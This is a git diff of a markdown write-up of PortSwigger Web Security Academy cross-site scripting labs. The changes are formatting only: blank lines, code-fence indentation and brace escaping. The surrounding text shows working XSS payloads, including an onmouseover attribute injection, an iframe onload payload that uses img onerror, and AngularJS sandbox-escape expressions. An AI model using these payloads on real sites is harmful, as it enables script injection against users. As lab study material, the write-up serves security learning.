@@ -223,6 +223,7 @@ The application contains a reflected XSS vulnerability in the search blog featur
   URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
   Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
   ~~~
+
   {: .box-note}
   **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.
 
@@ -252,6 +253,7 @@ There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` 
   ~~~
   URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
   ~~~
+
   {: .box-note}
   **Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
   
@@ -292,7 +294,7 @@ This instance contains a DOM-based XSS vulnerability in the stock checker functi
   <summary>Click me to expand the process</summary>
   
 1. Firstly, I discover the function in the inspection tab (`right-click on the webpage > inspect`). <br>And I learn that the script builds a `<select name="storeId">` dropdown by reading a `storeId` query parameter from the URL and, if present, adding it as the selected `<option>` before adding the three hard-coded stores (skipping any duplicate). <br>It uses `document.write` with the raw URL value, so unescaped input could be reflected into the page; creating elements and setting textContent/value.
-  ```javascript
+```javascript
   var stores = ["London", "Paris", "Milan"];
   var store = (new URLSearchParams(window.location.search)).get('storeId');
   document.write('<select name="storeId">');
@@ -308,7 +310,7 @@ This instance contains a DOM-based XSS vulnerability in the stock checker functi
   }
   
   document.write('</select>');
-  ```
+```
   
 2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (test) to see the application's response. As expected, I am able to add a new selected `<option>`.
 ~~~
@@ -341,8 +343,8 @@ This instance contains a DOM-based XSS vulnerability in an `AngularJS` expressio
 
 1. After did some researches ([AngularJS - Escaping the Expression Sandbox](https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss), [Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function), [Object.prototype.constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor), ) I come up with a couple of different payloads to pybass the security filter.
   ~~~
-  Payload-1: {{$eval.constructor(prompt('AngularJS_xss'))()}}
-  Payload-2: {{$on.constructor('prompt("AngularJS_xss")')()}}
+  Payload-1: \{\{$eval.constructor(prompt('AngularJS_xss'))()\}\}
+  Payload-2: \{\{$on.constructor('prompt("AngularJS_xss")')()\}\}
   ~~~
   
 </details>
